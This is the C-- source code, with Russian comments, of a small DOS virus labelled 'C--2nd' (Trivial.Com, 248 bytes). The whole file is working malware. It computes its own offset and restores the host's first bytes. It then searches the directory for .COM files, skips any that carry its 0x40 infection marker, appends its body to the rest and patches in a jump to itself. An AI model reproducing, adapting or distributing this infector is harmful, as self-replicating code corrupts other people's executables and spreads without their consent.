/* Уже меньше АСМовых вставок,но таковые всеравно имеются. Размер соответственно
 больше...
Name:	C--2nd
Type:	Trivial.Com
Size:	248
*/

/* Описания флагов компилятора */
?alignword		0		/* Нет выравнивания по словам */
?argc			0		/* Нет процедуры обработки 
						коммандной строки */
?ctrl_c			0		/* Нет обработчика ctrl-c */
?parsecommandline	0		/* Аналогично argc */
?codesize				/* Оптимизация по размеру */
?resize			0		/* Нет процедуры изменения блока 
						памяти */
?jumptomain		short		/* Прыжок к main типа short */
?startaddress		0		/* org 0 */

/* Некоторые include */

?include "dos.h--"

/* Длина вируса..Не знаю как получить ее динамически... */
?define	vlen		248

byte	old[4] = {0x90,0xCD,0x20,0x90};	/* Первоначальный носитель */
byte	jmpc   = 0xE9;
word	jofs   = 0;
byte	mark   = 0x40;
/*---------------------------------------------------------------*/
main()
byte	dta[43];
word	temp;
{
 $call lbl
lbl:
 $pop  SI
 SI = SI - #lbl;	/* Получим дельту */
 
 BX = SI + #old;
 for (DI=0x100;DI<0x104;DI++,BX++) DSBYTE[DI] = DSBYTE[BX];

 setDTA(SS,#dta);		/* Установим Dta */
 if (FINDFIRSTFILE(,,0,#fmask+SI) == 0)
  {
   do
    {
      BX = FOPEN(2,,,#dta+0x1e);	/* Откроем найденый файл */
      FREAD(,BX,4,#old+SI);		/* Прочитаем 4 байта */
       if (old[3+SI] != 0x40)		/* Есть метка заражения ? */
         {
          temp = FSEEK(2,BX,0,0);	/* Прыгаем на конец файла */
          FWRITE(,BX,vlen,SI);		/* Пишим нас */
	  jofs[SI] = temp - 3;
          FSEEK(0,BX,0,0);		/* На начало файла */
          FWRITE(,BX,4,#jmpc+SI);	/* Пишим Jmp */
         }
       FCLOSE(,BX);			/* Закрываем файл */
    } while(FINDNEXTFILE() == 0); 
  }
}
byte	fmask = "*.com";		/* Собственно маска */
